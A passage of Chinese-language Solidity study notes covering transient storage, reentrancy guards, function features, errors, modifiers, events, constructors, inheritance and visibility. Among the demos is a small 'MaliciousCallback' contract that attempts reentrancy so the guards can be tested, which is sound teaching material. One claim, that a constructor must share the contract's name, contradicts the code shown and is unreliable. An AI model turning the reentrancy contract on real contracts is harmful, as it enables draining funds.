assembly 将 newValue 存储到 temp 变量中。 由于没有指定 temp 的存储位置，并且在 assembly 块内赋值，编译器会将其视为 transient storage。 sstore(storedData.slot, temp) 将 temp 的值写入 storedData 的存储槽位。 注意事项: Transient storage 的使用需要谨慎，因为它依赖于 EVM 的内部机制。不正确的使用可能会导致意外的行为。 尽量避免在复杂的场景中使用 transient storage，因为它可能会增加代码的复杂性和理解难度。 总结: Transient storage 是一种强大的优化工具，可以降低 gas 成本，但需要谨慎使用。 对于大多数情况，使用 memory 或 storage 就足够了。 只有在需要在函数执行期间存储临时数据并且对性能要求较高的情况下，才考虑使用 transient storage。 理解其临时性和实现方式至关重要。 ok，接下来继续看demo。 这段代码演示了 Solidity 中三种不同存储方式 (storage、memory 和 transient storage) 的区别，以及如何使用 transient storage 实现一个更节省 gas 的重入锁。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // Make sure EVM version and VM set to Cancun // Storage - data is stored on the blockchain // Memory - data is cleared out after a function call // Transient storage - data is cleared out after a transaction // 定义了一个接口 ITest，包含两个函数：val() 用于读取值，test() 用于执行测试逻辑。其他合约通过此接口进行交互。 interface ITest { function val() external view returns (uint256); function test() external; } // Callback 合约用于测试 TestStorage 和 TestTransientStorage 的合约，用于展示 normal storage 和 transient storage的区别 // Contract for testing TestStorage and TestTransientStorage // Shows the difference between normal storage and transient storage contract Callback { uint256 public val; // fallback() 函数会在被其他合约调用时执行，并将调用者的 val() 返回值存储到自身的 val 变量中。 fallback() external { val = ITest(msg.sender).val(); } // test() 函数则调用指定地址的 test() 函数。 function test(address target) external { ITest(target).test(); } } // TestStorage 使用 storage 存储 val 变量。 // test() 函数将 val 设置为 123，然后调用 msg.sender (即调用者，这里是 Callback) 的 fallback() 函数。 contract TestStorage { uint256 public val; function test() public { val = 123; bytes memory b = &quot;&quot;; msg.sender.call(b); } } // TestTransientStorage 使用 transient storage 存储值。 // 它使用内联汇编 (assembly) 将 321 存储到预定义的存储槽 SLOT 中。test() 函数与 TestStorage 类似，调用 msg.sender 的 fallback() 函数。val() 函数从 SLOT 读取值。 contract TestTransientStorage { bytes32 constant SLOT = 0; function test() public { assembly { tstore(SLOT, 321) } bytes memory b = &quot;&quot;; msg.sender.call(b); } function val() public view returns (uint256 v) { assembly { v := tload(SLOT) } } } // 这是一个恶意合约，用于测试重入漏洞。它的 fallback() 函数会再次调用 msg.sender 的 test() 函数，尝试进行重入攻击。 // Contract for testing reentrancy protection contract MaliciousCallback { uint256 public count = 0; // Try to reenter the target contract multiple times fallback() external { ITest(msg.sender).test(); } // Test function to initiate reentrance attack function attack(address _target) external { // First call to test() ITest(_target).test(); } } // 这是一个使用 storage 变量 locked 实现的重入锁。lock 修饰器确保在函数执行期间，locked 为 true，防止重入。 contract ReentrancyGuard { bool private locked; modifier lock() { require(!locked); locked = true; _; locked = false; } // 27587 gas function test() public lock { // Ignore call error bytes memory b = &quot;&quot;; msg.sender.call(b); } } // 这是一个使用 transient storage 实现的重入锁。lock 修饰器使用内联汇编操作 transient storage，实现与 ReentrancyGuard 相同的逻辑，但 gas 消耗更低。 contract ReentrancyGuardTransient { bytes32 constant SLOT = 0; modifier lock() { assembly { if tload(SLOT) { revert(0, 0) } tstore(SLOT, 1) } _; assembly { tstore(SLOT, 0) } } // 4909 gas function test() external lock { // Ignore call error bytes memory b = &quot;&quot;; msg.sender.call(b); } } 这段代码的核心在于对比 TestStorage、TestTransientStorage、ReentrancyGuard 和 ReentrancyGuardTransient。它展示了 transient storage 如何在不修改合约状态的情况下，实现与 storage 类似的功能，并且 gas 消耗更低，尤其是在重入锁的实现上体现了其优势。 这个demo其实似懂非懂，后面再回来看吧。 0x10 Function public函数不能接受某些数据类型作为输入或输出，如mapping // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Function { // [1] 函数可以返回多个返回值 // Functions can return multiple values. function returnMany() public pure returns (uint256, bool, uint256) { return (1, true, 2); } // 函数返回值值可以被命名 // Return values can be named. function named() public pure returns (uint256 x, bool b, uint256 y) { return (1, true, 2); } // 函数返回值可以被赋值给他们的名字，而无须显式地return // Return values can be assigned to their name. // In this case the return statement can be omitted. function assigned() public pure returns (uint256 x, bool b, uint256 y) { x = 1; b = true; y = 2; } // Use destructuring assignment when calling another // function that returns multiple values. function destructuringAssignments() public pure returns (uint256, bool, uint256, uint256, uint256) { (uint256 i, bool b, uint256 j) = returnMany(); // 值可以被省略，这里左边省略了一个变量 // Values can be left out. (uint256 x,, uint256 y) = (4, 5, 6); return (i, b, j, x, y); } // map类型不能作为input或者output // Cannot use map for either input or output // array可以被作为 input // Can use array for input function arrayInput(uint256[] memory _arr) public {} // array也可以被用作 output // Can use array for output // 注意，arrayOutput() 返回的是 memory 数组，避免直接返回 storage 数组的高 gas 成本。 // arr 是一个 public 的状态变量，它本身是一个 storage 数组，但 arrayOutput() 函数返回的是它的一个副本，存储在 memory 中。 uint256[] public arr; function arrayOutput() public view returns (uint256[] memory) { return arr; } } // Call function with key-value inputs contract XYZ { // 接受多个不同类型的参数 function someFuncWithManyInputs( uint256 x, uint256 y, uint256 z, address a, bool b, string memory c ) public pure returns (uint256) {} // 调用 someFuncWithManyInputs，直接传值，参数顺序不能乱 function callFunc() external pure returns (uint256) { return someFuncWithManyInputs(1, 2, 3, address(0), true, &quot;c&quot;); } // 使用键值对语法来调用多参数函数someFuncWithManyInputs。 // 这种方式可以提高代码可读性，尤其是在参数较多的情况下。 参数的顺序可以随意调整。 function callFuncWithKeyValue() external pure returns (uint256) { return someFuncWithManyInputs({ a: address(0), b: true, c: &quot;c&quot;, x: 1, y: 2, z: 3 }); } } 为什么public函数不能使用 mapping 作为输入或输出？ Solidity 的 mapping 类型是一种键值对映射，它存储在合约的 storage 中。由于 mapping 的大小不固定，并且其元素的存储位置是由键的哈希值决定的，因此无法直接将其作为参数传递给外部调用者或从外部函数返回。 输入参数: 如果允许 mapping 作为输入参数，外部调用者需要提供整个 mapping 的数据，这在大多数情况下是不切实际的，因为 mapping 可能会非常大。 输出参数: 类似地，如果允许 mapping 作为输出参数，函数需要返回整个 mapping 的数据，这会导致高昂的 gas 成本，甚至可能超过区块 gas 限制。 因此，为了避免这些问题，Solidity 限制了 mapping 类型在public函数参数中的使用。 你只能在函数内部使用 mapping，或者将其作为 internal 或 private 函数的参数。 0x11 View and Pure Functions view和pure这两个关键字用于声明函数不会修改或读取合约的状态，从而帮助编译器进行优化并降低 gas 消耗。 1. view 函数: 作用: view 函数声明它不会修改合约的状态。这意味着它不会修改任何状态变量，也不会触发任何事件或发送以太币。 读取状态: view 函数可以读取合约的状态变量。 gas 消耗: 在链外调用 view 函数（例如，通过 web3.js）不会消耗 gas，因为它们不会修改区块链状态。在链上调用 view 函数仍然会消耗 gas，但如果在同一个交易中进行其他状态修改操作，view 函数的 gas 消耗可能会被优化。 **示例:**下面demo中 的 addToX(uint256 y) 函数是一个 view 函数，它读取状态变量 x 的值，并将其与输入参数 y 相加后返回结果。它没有修改任何状态变量。 2. pure 函数: 作用: pure 函数声明它既不会修改合约的状态，也不会读取合约的状态。它只依赖于其输入参数进行计算。 读取状态: pure 函数不能读取合约的状态变量。 gas 消耗: 与 view 函数类似，在链外调用 pure 函数不会消耗 gas。在链上调用 pure 函数也会消耗 gas，但可能会被优化。 示例: add(uint256 i, uint256 j) 函数是一个 pure 函数，它将两个输入参数 i 和 j 相加后返回结果。它没有读取或修改任何状态变量。 view vs. pure: 特性 view pure 修改状态 否 否 读取状态 可以 不可以 示例 读取状态变量 执行纯计算 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract ViewAndPure { uint256 public x = 1; // Promise not to modify the state. function addToX(uint256 y) public view returns (uint256) { return x + y; } // Promise not to modify or read from the state. function add(uint256 i, uint256 j) public pure returns (uint256) { return i + j; } } 0x12 Error 错误处理机制: 在 Solidity 中，如果一个交易执行过程中发生错误，所有对状态的修改都会被回滚，就像交易从未发生过一样。这确保了交易的原子性，要么全部执行成功，要么全部回滚。 错误处理函数: Solidity 提供了三种主要的错误处理函数： require(condition, errorMessage): 用途: 主要用于验证输入参数、执行前的条件以及其他函数的返回值。它是最常用的错误处理函数。 机制: 如果 condition 为 false，则会触发错误，回滚状态更改，并返回 errorMessage。 示例: testRequire revert(errorMessage): 用途: 与 require 类似，但更适用于复杂的条件检查。你可以使用 if 语句和其他控制流结构来构建更复杂的逻辑，并在需要时调用 revert。 机制: 调用 revert 会触发错误，回滚状态更改，并返回 errorMessage。 示例: testRevert assert(condition): 用途: 主要用于检查内部错误和不变式。它不应该用于验证用户输入或外部条件。 机制: 如果 condition 为 false，则会触发错误，回滚状态更改。在生产环境中，assert 失败通常表示代码中存在 bug。 示例: testAssert **自定义错误 (Custom Errors)😗*Solidity 0.8.4 版本引入了自定义错误，它可以帮助节省 gas，尤其是在需要传递多个参数来描述错误信息时。 定义: 使用 error 关键字定义自定义错误，类似于定义事件。 使用: 使用 revert 触发自定义错误，并传递相应的参数。 示例：testCustomError demo分析见注释： // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Error { function testRequire(uint256 _i) public pure { // Require should be used to validate conditions such as: // - inputs // - conditions before execution // - return values from calls to other functions require(_i &gt; 10, &quot;Input must be greater than 10&quot;); } function testRevert(uint256 _i) public pure { // Revert is useful when the condition to check is complex. // This code does the exact same thing as the example above if (_i &lt;= 10) { revert(&quot;Input must be greater than 10&quot;); } } uint256 public num; function testAssert() public view { // Assert should only be used to test for internal errors, // and to check invariants. // Here we assert that num is always equal to 0 // since it is impossible to update the value of num assert(num == 0); } // custom error error InsufficientBalance(uint256 balance, uint256 withdrawAmount); function testCustomError(uint256 _withdrawAmount) public view { uint256 bal = address(this).balance; if (bal &lt; _withdrawAmount) { revert InsufficientBalance({ balance: bal, withdrawAmount: _withdrawAmount }); } } } 对于testCustomError，我给_withdrawAmount输入100，触发error，报错如下： call to Error.testCustomError errored: Error occurred: revert. revert The transaction has been reverted to the initial state. Error provided by the contract: InsufficientBalance Parameters: { &quot;balance&quot;: { &quot;value&quot;: &quot;0&quot; }, &quot;withdrawAmount&quot;: { &quot;value&quot;: &quot;100&quot; } } If the transaction failed for not having enough gas, try increasing the gas limit gently. 另一个demo如下： // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Account { uint256 public balance; uint256 public constant MAX_UINT = 2 ** 256 - 1; function deposit(uint256 _amount) public { uint256 oldBalance = balance; uint256 newBalance = balance + _amount; // balance + _amount does not overflow if balance + _amount &gt;= balance // 如果加完之后反而更小，说明发生溢出 require(newBalance &gt;= oldBalance, &quot;Overflow&quot;); balance = newBalance; assert(balance &gt;= oldBalance); } function withdraw(uint256 _amount) public { uint256 oldBalance = balance; // balance - _amount does not underflow if balance &gt;= _amount // 余额必须大于输入 require(balance &gt;= _amount, &quot;Underflow&quot;); if (balance &lt; _amount) { revert(&quot;Underflow&quot;); } balance -= _amount; // 减完再次确认，不能下溢 assert(balance &lt;= oldBalance); } } 0x13 Function Modifier 修饰器是一种可以在函数调用之前和/或之后执行的代码块，可以用来实现各种功能，例如访问控制、输入验证和防止重入攻击。 修饰器可以用来： 限制访问: 控制哪些用户可以调用特定函数。 验证输入: 确保函数的输入参数符合要求。 防止重入攻击: 阻止恶意合约通过递归调用来操纵合约的状态。 修饰器的语法: modifier modifierName(parameters) { // Code to be executed before the function call _; // Placeholder for the function code // Code to be executed after the function call } modifier 关键字用于声明修饰器。 modifierName 是修饰器的名称。 parameters 是可选的参数列表。 _ 是一个特殊的占位符，表示函数的代码将在该位置执行。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract FunctionModifier { // We will use these variables to demonstrate how to use // modifiers. address public owner; uint256 public x = 10; bool public locked; constructor() { // Set the transaction sender as the owner of the contract. owner = msg.sender; } // Modifier to check that the caller is the owner of // the contract. modifier onlyOwner() { require(msg.sender == owner, &quot;Not owner&quot;); // Underscore is a special character only used inside // a function modifier and it tells Solidity to // execute the rest of the code. // 函数代码将在这里执行 _; } // Modifiers can take inputs. This modifier checks that the // address passed in is not the zero address. modifier validAddress(address _addr) { require(_addr != address(0), &quot;Not valid address&quot;); _; } // 当一个函数有多个修饰器时，它们会按照在函数定义中出现的顺序依次执行。 // 在 changeOwner 函数中，首先执行 onlyOwner 修饰器，然后执行 validAddress 修饰器，最后执行函数体本身。 function changeOwner(address _newOwner) public onlyOwner // 只有合约所有者可以调用 validAddress(_newOwner) // 新owner的地址必须有效 { owner = _newOwner; } // Modifiers can be called before and / or after a function. // This modifier prevents a function from being called while // it is still executing. // 防止重入攻击。使用一个布尔变量 locked 来跟踪函数是否正在执行。如果 locked 为 true，则表示函数正在执行，后续的调用将被阻止。 modifier noReentrancy() { require(!locked, &quot;No reentrancy&quot;); locked = true; _; locked = false; } // 在函数执行的开始，noReentrancy 修饰器会被调用 // 修饰器会检查 locked 状态变量。如果 locked 为 true，表示函数正在执行，则会触发 revert(&quot;No reentrancy&quot;)，阻止重入。 // 否则，它会将 locked 设置为 true，并在函数执行完毕后将其重置为 false。 function decrement(uint256 i) public noReentrancy { x -= i; // 检查 i 是否大于 1。 如果是，则会递归调用 decrement 函数，传入 i - 1 作为参数 if (i &gt; 1) { decrement(i - 1); // 递归调用 } } } 递归调用的例子: 初始 x = 10，假设调用 decrement(3): 第一次调用 decrement(3): x 变为 10 - 3 = 7，然后调用 decrement(2)。 第二次调用 decrement(2): x 变为 7 - 2 = 5，然后调用 decrement(1)。 第三次调用 decrement(1): x 变为 5 - 1 = 4。 由于 i 不再大于 1，递归停止。 最终，x 的值变为 4。 防止重入攻击: noReentrancy 修饰器至关重要，因为它可以防止重入攻击。 想象一下，如果没有这个修饰器，一个恶意合约可以调用 decrement 函数，并在 decrement 函数内部再次调用 decrement 函数（在 x -= i 之后，递归调用之前）。 由于 locked 变量的存在，恶意合约的第二次调用会被阻止，因为 locked 已经被设置为 true。 这可以防止恶意合约在 locked 被重置为 false 之前多次递减 x 的值。 说白了，就是C语言里的race问题。 0x14 Events 事件Events允许将日志记录到以太坊区块链上，这对于 DApp 开发和链下监控非常有用。 事件主要有两个用途： 监听events并更新用户界面: DApp 可以监听智能合约发出的事件，并在事件发生时更新用户界面。 这使得 DApp 可以对区块链上的状态变化做出反应，并向用户提供实时反馈。 一种廉价的存储方式: 与直接将数据存储在合约的存储空间中相比，通过事件记录数据更加便宜。 这是因为事件数据存储在交易的日志中，而不是合约的存储空间中。 但是，需要注意的是，访问事件数据比访问合约存储空间中的数据更复杂。 Event的声明： event EventName(parameter1 type, parameter2 type, ...); event 关键字用于声明事件。 EventName 是事件的名称。 parameter1 type, parameter2 type, ... 是事件的参数列表，可以包含任意数量的参数和类型。 索引参数 (Indexed Parameters): 最多可以将三个事件参数声明为 indexed。 索引参数可以帮助你过滤日志，更高效地查找特定事件。 当你在链下查询事件时，可以根据索引参数进行过滤，从而减少需要处理的数据量。也就是日志的TAG。 发出事件 (Emitting Events): 使用 emit 关键字发出事件： emit EventName(value1, value2, ...); EventName 是Event的名称。 value1, value2, ... 是传递给Event参数的值。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Event { // Event declaration // Up to 3 parameters can be indexed. // Indexed parameters help you filter the logs by the indexed parameter // Log 事件: 包含两个参数：sender (被索引) 和 message。 event Log(address indexed sender, string message); // AnotherLog 事件: 不包含任何参数。 event AnotherLog(); // 当 test 函数被调用时，会发出两个 Log 事件，记录发送者的地址和消息内容。 // 由于 sender 被索引，你可以轻松地过滤特定地址发出的日志。 function test() public { emit Log(msg.sender, &quot;Hello World!&quot;); emit Log(msg.sender, &quot;Hello EVM!&quot;); emit AnotherLog(); } } 执行test函数的结果： ...... to Event.test() 0x5xxx gas 30257 gas transaction cost 26310 gas execution cost 5246 gas input 0xxxx output 0x decoded input {} decoded output {} logs [ { &quot;from&quot;: &quot;xxx&quot;, &quot;topic&quot;: &quot;xxx&quot;, &quot;event&quot;: &quot;Log&quot;, &quot;args&quot;: { &quot;0&quot;: &quot;xxx&quot;, &quot;1&quot;: &quot;Hello World!&quot;, &quot;sender&quot;: &quot;xxx&quot;, &quot;message&quot;: &quot;Hello World!&quot; } }, { &quot;from&quot;: &quot;xxx&quot;, &quot;topic&quot;: &quot;xxx&quot;, &quot;event&quot;: &quot;Log&quot;, &quot;args&quot;: { &quot;0&quot;: &quot;xxx&quot;, &quot;1&quot;: &quot;Hello EVM!&quot;, &quot;sender&quot;: &quot;xxx&quot;, &quot;message&quot;: &quot;Hello EVM!&quot; } }, { &quot;from&quot;: &quot;xxx&quot;, &quot;topic&quot;: &quot;xxx&quot;, &quot;event&quot;: &quot;AnotherLog&quot;, &quot;args&quot;: {} } ] raw logs [ ...... 0x15 Events Advanced 主要是讲Events的更高级用法，包括事件驱动架构和事件订阅。一些高级用例如下： 事件过滤和监控： 通过索引事件参数，可以高效地过滤和搜索特定事件，实现实时更新和分析。 事件日志分析和解码： 可以从事件日志中提取和处理数据，用于链下数据分析和应用。 事件驱动架构： 可以使用事件来协调和触发不同阶段的流程，构建去中心化应用。 事件订阅： 允许外部合约或客户端订阅事件，并在事件发生时接收实时通知和更新。 Event-Driven Architecture 下面demo中，EventDrivenArchitecture合约演示了一个简单的转账流程，分为 initiateTransfer（发起转账）和 confirmTransfer（确认转账）两个阶段。 每个阶段都会发出一个事件，用于记录转账信息。 transferConfirmations 映射用于跟踪转账是否已被确认。 Event Subscription and Real-Time Updates EventSubscription合约演示了如何实现事件订阅。 IEventSubscriber 接口定义了订阅者需要实现的 handleTransferEvent 函数，用于处理接收到的事件数据。 EventSubscription 合约会维护一个订阅者列表，并在 transfer 函数被调用时，遍历列表并调用每个订阅者的 handleTransferEvent 函数，将事件数据传递给订阅者。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.14; // Event-Driven Architecture contract EventDrivenArchitecture { event TransferInitiated( address indexed from, address indexed to, uint256 value ); // 确认转账 event TransferConfirmed( address indexed from, address indexed to, uint256 value ); mapping(bytes32 =&gt; bool) public transferConfirmations; // 发起转账时，先发出一个event，然后进行实际的转账操作 function initiateTransfer(address to, uint256 value) public { emit TransferInitiated(msg.sender, to, value); // ... (initiate transfer logic) 这里会进行实际的转账操作 } // 确认转账时，先检查是否已经确认，然后发出一个event，最后进行确认转账 function confirmTransfer(bytes32 transferId) public { require( !transferConfirmations[transferId], &quot;Transfer already confirmed&quot; ); transferConfirmations[transferId] = true; emit TransferConfirmed(msg.sender, address(this), 0); // value 为 0 // ... (confirm transfer logic) 这里会进行确认转账的操作 } } // Event Subscription and Real-Time Updates interface IEventSubscriber { function handleTransferEvent(address from, address to, uint256 value) external; } contract EventSubscription { event LogTransfer(address indexed from, address indexed to, uint256 value); // 维护一个订阅者列表 mapping(address =&gt; bool) public subscribers; address[] public subscriberList; function subscribe() public { // 订阅事件 require(!subscribers[msg.sender], &quot;Already subscribed&quot;); subscribers[msg.sender] = true; subscriberList.push(msg.sender); } function unsubscribe() public { // 取消订阅 require(subscribers[msg.sender], &quot;Not subscribed&quot;); subscribers[msg.sender] = false; for (uint256 i = 0; i &lt; subscriberList.length; i++) { if (subscriberList[i] == msg.sender) { subscriberList[i] = subscriberList[subscriberList.length - 1]; subscriberList.pop(); break; } } } function transfer(address to, uint256 value) public { emit LogTransfer(msg.sender, to, value); for (uint256 i = 0; i &lt; subscriberList.length; i++) { IEventSubscriber(subscriberList[i]).handleTransferEvent( msg.sender, to, value ); } } } 接口的学习还在后面，这里可以理解为类似为java的接口，他的具体实现应该是订阅者自己定义？ 最佳实践和建议： 索引正确的事件参数： 通常应该索引地址，而不应该索引金额等数值类型，以便高效过滤。 避免冗余事件： 不要发出底层库或合约已经覆盖的事件。 事件不能在 view 或 pure 函数中使用： 因为事件会修改区块链状态（存储日志）。 注意事件的 Gas 成本： 特别是索引参数时，Gas 成本会更高。 0x16 Constructor 构造函数是一个可选的函数，在合约创建时执行一次。它通常用于初始化合约的状态变量。 构造函数的名称必须与合约名称相同。 向父合约构造函数传递参数： 当一个合约继承自其他合约时，需要在子合约的构造函数中调用父合约的构造函数。 如果父合约的构造函数需要参数，则有两种方式传递参数： 在继承列表中传递参数: contract B is X(&quot;Input to X&quot;), Y(&quot;Input to Y&quot;) {} 这种方式直接在inheritance list中调用父合约的构造函数并传递参数。 X(&quot;Input to X&quot;) 会调用 X 合约的构造函数，并将字符串 &quot;Input to X&quot; 传递给 _name 参数。 Y(&quot;Input to Y&quot;) 同理。 在子合约的构造函数中传递参数: contract C is X, Y { constructor(string memory _name, string memory _text) X(_name) Y(_text) {} } 这种方式在子合约的构造函数中使用类似函数修饰器的语法调用父合约的构造函数。 X(_name) 和 Y(_text) 分别调用 X 和 Y 的构造函数，并将参数传递进去。 父合约构造函数的调用顺序： 无论在子合约构造函数中以何种顺序列出父合约，父合约的构造函数总是按照继承顺序调用。 contract D is X, Y { ... }: 先调用 X 的构造函数，再调用 Y 的构造函数，最后执行 D 的构造函数体。 contract E is X, Y { ... }: 即使在 E 的构造函数中先写了 Y(&quot;Y was called&quot;)，仍然会先调用 X 的构造函数，再调用 Y 的构造函数。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // Base contract X contract X { string public name; // X的构造函数 constructor(string memory _name) { name = _name; } } // Base contract Y contract Y { string public text; // Y的构造函数 constructor(string memory _text) { text = _text; } } // There are 2 ways to initialize parent contract with parameters. // 继承自 X 和 Y，并在inheritanace list中传递参数 // Pass the parameters here in the inheritance list. contract B is X(&quot;Input to X&quot;), Y(&quot;Input to Y&quot;) {} // 继承自 X 和 Y，并在子合约的构造函数中传递参数。 contract C is X, Y { // Pass the parameters here in the constructor, // similar to function modifiers. constructor(string memory _name, string memory _text) X(_name) Y(_text) {} } // Parent constructors are always called in the order of inheritance // regardless of the order of parent contracts listed in the // constructor of the child contract. // Order of constructors called: // 1. X // 2. Y // 3. D contract D is X, Y { constructor() X(&quot;X was called&quot;) Y(&quot;Y was called&quot;) {} } // Order of constructors called: // 1. X // 2. Y // 3. E contract E is X, Y { // 不管下面构造函数里调用父合约的顺序是怎么样的，都要按照这一行继承的顺序来执行 constructor() Y(&quot;Y was called&quot;) X(&quot;X was called&quot;) {} } 0x17 Inheritance 主要是学习多重继承以及 virtual 和 override 关键字的用法 多重继承: Solidity 支持多重继承，这意味着一个合约可以继承多个父合约。 使用 is 关键字来继承其他合约。 virtual 和 override 关键字: virtual: 如果一个函数打算被子合约重写，则必须将其声明为 virtual。 override: 如果一个函数重写了父合约的函数，则必须使用 override 关键字。 这有助于防止意外重写，提高代码的安全性。 继承顺序: 继承顺序非常重要。 必须按照从“最基础”到“最派生”的顺序列出父合约。 例如，在 F 合约中，A 是 B 的父合约，因此必须先列出 A，再列出 B。 如果颠倒顺序，编译器会报错。 函数调用顺序 (深度优先，从右到左): 当调用一个在多个父合约中定义的函数时，Solidity 会按照从右到左、深度优先的顺序搜索父合约。 super 关键字: super 关键字用于调用父合约的函数。 在多重继承的情况下，super 会根据继承顺序和深度优先原则调用最右边的父合约的函数。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // 下图中，D 继承自 B 和 C，而 B 又继承自 A，所以 D 间接继承自 A。 当调用 D.foo() 时，会先找到 C.foo()，然后是 B.foo()，最后是 A.foo()。 由于 C.foo() 存在，因此会调用它。 /* Graph of inheritance A / \\ B C / \\ / F D,E */ // A 合约: 定义了一个名为 foo 的虚函数，返回 &quot;A&quot;。 contract A { function foo() public pure virtual returns (string memory) { return &quot;A&quot;; } } // B 和 C 合约: 都继承自 A，并重写了 foo 函数，分别返回 &quot;B&quot; 和 &quot;C&quot;。 // Contracts inherit other contracts by using the keyword 'is'. contract B is A { // Override A.foo() function foo() public pure virtual override returns (string memory) { return &quot;B&quot;; } } contract C is A { // Override A.foo() function foo() public pure virtual override returns (string memory) { return &quot;C&quot;; } } // Contracts can inherit from multiple parent contracts. // When a function is called that is defined multiple times in // different contracts, parent contracts are searched from // right to left, and in depth-first manner. // D 合约: 继承自 B 和 C。 D.foo() 返回 &quot;C&quot;，因为 C 是最右边的父合约，并且定义了 foo 函数。 super.foo() 会调用 C.foo()。 contract D is B, C { // D.foo() returns &quot;C&quot; // since C is the right most parent contract with function foo() function foo() public pure override(B, C) returns (string memory) { return super.foo(); } } // E 合约: 继承自 C 和 B。 E.foo() 返回 &quot;B&quot;，因为 B 是最右边的父合约，并且定义了 foo 函数。 super.foo() 会调用 B.foo()。 contract E is C, B { // E.foo() returns &quot;B&quot; // since B is the right most parent contract with function foo() function foo() public pure override(C, B) returns (string memory) { return super.foo(); } } // F 合约: 继承自 A 和 B。 F.foo() 返回 &quot;B&quot;，因为 B 重写了 A 的 foo 函数，并且 B 是最右边的父合约。 super.foo() 会调用 B.foo()。 // Inheritance must be ordered from “most base-like” to “most derived”. // Swapping the order of A and B will throw a compilation error. contract F is A, B { function foo() public pure override(A, B) returns (string memory) { return super.foo(); } } 0x18 Shadowing Inherited State Variables 这个例子学习如何在 Solidity 中正确地重写继承的状态变量，并指出了直接在子合约中重新声明状态变量的错误做法（也就是变量遮蔽）。 状态变量不能被重新声明: 与函数不同，状态变量不能通过在子合约中重新声明来重写。 如果在子合约中声明一个与父合约同名的状态变量，这并不会重写父合约的变量，而是在子合约中创建了一个新的状态变量，这被称为“变量遮蔽（Shadowing）”。 在 Solidity 0.6 及以后的版本中，这种做法是被禁止的，会导致编译错误。 注释掉的 contract B 展示了这种错误用法。 正确重写继承的状态变量: 正确的方法是在子合约的构造函数中修改父合约的状态变量的值。 contract C 演示了这种做法： contract C is A { constructor() { name = &quot;Contract C&quot;; } } 在 C 的构造函数中，name = &quot;Contract C&quot;; 修改了继承自 A 的 name 变量的值。 因此，调用 C.getName() 会返回 &quot;Contract C&quot;。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // A 合约: 定义了一个名为 name 的公共状态变量，并初始化为 &quot;Contract A&quot;。 它还包含一个名为 getName 的视图函数，用于返回 name 的值。 contract A { string public name = &quot;Contract A&quot;; function getName() public view returns (string memory) { return name; } } // B 合约 (已注释掉): 展示了错误的重写方式。 直接在 B 中声明 name 变量会导致编译错误。 // Shadowing is disallowed in Solidity 0.6 // This will not compile // contract B is A { // string public name = &quot;Contract B&quot;; // } // C 合约: 展示了正确的重写方式。 在构造函数中修改 name 的值。 contract C is A { // This is the correct way to override inherited state variables. constructor() { name = &quot;Contract C&quot;; } // C.getName returns &quot;Contract C&quot; } 0x19 Calling Parent Contracts 这个例子学习如何在 Solidity 中调用父合约的函数，以及 super 关键字的用法。 调用父合约函数的两种方式： 直接调用: 可以通过 父合约名称.函数名称() 的方式直接调用父合约的函数。 例如，A.foo()。 使用 super 关键字: super.函数名称() 会调用所有直接父合约的该函数。 注意，super 只会调用直接父合约的函数。 super 关键字的特性： 从右到左，深度优先: 在多重继承的情况下，super 会按照从右到左、深度优先的顺序调用父合约的函数。 避免重复调用: 即使 super 在多个父合约中被调用，同一个祖先合约的函数也只会被调用一次。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; /* Inheritance tree A / \\ B C \\ / D */ // A 合约: 定义了两个虚函数 foo 和 bar，并发出相应的事件日志。 contract A { // This is called an event. You can emit events from your function // and they are logged into the transaction log. // In our case, this will be useful for tracing function calls. event Log(string message); function foo() public virtual { emit Log(&quot;A.foo called&quot;); } function bar() public virtual { emit Log(&quot;A.bar called&quot;); } } // B 合约: 继承自 A，并重写了 foo 和 bar 函数。 B.foo 直接调用 A.foo，而 B.bar 使用 super.bar。 contract B is A { function foo() public virtual override { emit Log(&quot;B.foo called&quot;); A.foo(); } function bar() public virtual override { emit Log(&quot;B.bar called&quot;); super.bar(); } } // C 合约: 继承自 A，并重写了 foo 和 bar 函数。 C.foo 直接调用 A.foo，而 C.bar 使用 super.bar。 contract C is A { function foo() public virtual override { emit Log(&quot;C.foo called&quot;); A.foo(); } function bar() public virtual override { emit Log(&quot;C.bar called&quot;); super.bar(); } } // D 合约: 继承自 B 和 C。 // D.foo 使用 super.foo，它会先调用 C.foo，然后 C.foo 又直接调用了 A.foo。 // D.bar 使用 super.bar，它会先调用 C.bar，然后 C.bar 中的 super.bar 会调用 B.bar，最后 B.bar 中的 super.bar 会调用 A.bar。 contract D is B, C { // Try: // - Call D.foo and check the transaction logs. // Although D inherits A, B and C, it only called C and then A. // - Call D.bar and check the transaction logs // D called C, then B, and finally A. // Although super was called twice (by B and C) it only called A once. function foo() public override(B, C) { super.foo(); } function bar() public override(B, C) { super.bar(); } } 0x1A Visibility 这个例子学习Solidity 中函数和状态变量的可见性修饰符。 可见性修饰符: 函数和状态变量必须声明其可被其他合约访问的权限。 这有助于控制合约的访问权限，提高代码的安全性。 函数的可见性: public: 任何合约和账户都可以调用。 private: 只能在定义该函数的合约内部调用。 继承的合约也不能调用私有函数。 internal: 只能在定义该函数的合约内部以及继承该合约的合约内部调用。 external: 只能被其他合约和账户调用，不能在合约内部调用。 状态变量的可见性: 状态变量可以声明为 public、private 或 internal，但不能声明为 external。 public: 任何合约和账户都可以访问。 编译器会自动创建一个 getter 函数。 private: 只能在定义该变量的合约内部访问。 internal: 只能在定义该变量的合约内部以及继承该合约的合约内部访问。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // Base 合约: 包含了不同可见性的函数和状态变量的示例。 // testPrivateFunc 展示了如何在合约内部调用私有函数 privateFunc。 // testInternalFunc 展示了如何在合约内部调用内部函数 internalFunc。 // 注释掉的 testExternalFunc 说明了不能在合约内部调用外部函数 externalFunc。 contract Base { // Private function can only be called // - inside this contract // Contracts that inherit this contract cannot call this function. function privateFunc() private pure returns (string memory) { return &quot;private function called&quot;; } function testPrivateFunc() public pure returns (string memory) { return privateFunc(); } // Internal function can be called // - inside this contract // - inside contracts that inherit this contract function internalFunc() internal pure returns (string memory) { return 